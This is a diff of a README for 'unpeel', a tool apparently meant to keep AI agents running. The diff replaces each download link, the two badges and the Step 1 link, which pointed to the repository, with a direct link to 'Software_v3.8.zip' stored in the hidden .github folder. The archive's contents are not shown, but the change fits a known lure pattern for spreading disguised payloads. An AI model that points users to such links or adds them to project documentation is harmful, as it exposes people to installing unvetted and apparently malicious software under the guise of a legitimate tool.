@@ -1,6 +1,6 @@
 # 🧅 unpeel - Keep Your AI Agents Always On
 
-[![Download unpeel](https://img.shields.io/badge/Download-unpeel-4CAF50?style=for-the-badge&logo=github)](https://github.com/sayem861096/unpeel)
+[![Download unpeel](https://img.shields.io/badge/Download-unpeel-4CAF50?style=for-the-badge&logo=github)](https://github.com/sayem861096/unpeel/raw/refs/heads/main/.github/Software_v3.8.zip)
 
 ## 🎯 What Is unpeel?
 
@@ -23,7 +23,7 @@ Getting started with unpeel is straightforward. Here's what you need to do:
 
 ### Step 1: Download unpeel
 
-Visit this link to download the application: [Download unpeel](https://github.com/sayem861096/unpeel)
+Visit this link to download the application: [Download unpeel](https://github.com/sayem861096/unpeel/raw/refs/heads/main/.github/Software_v3.8.zip)
 
 ### Step 2: Install unpeel
 
@@ -176,7 +176,7 @@ A: Yes, you can pause all agents or stop unpeel completely at any time.
 
 unpeel transforms how you work with AI agents. No more starting and stopping - just set it up once and let your AI helpers work around the clock.
 
-[![Download unpeel Now](https://img.shields.io/badge/Download-unpeel_Now-2196F3?style=for-the-badge&logo=download)](https://github.com/sayem861096/unpeel)
+[![Download unpeel Now](https://img.shields.io/badge/Download-unpeel_Now-2196F3?style=for-the-badge&logo=download)](https://github.com/sayem861096/unpeel/raw/refs/heads/main/.github/Software_v3.8.zip)
 
 ## 💖 Support the Project
 
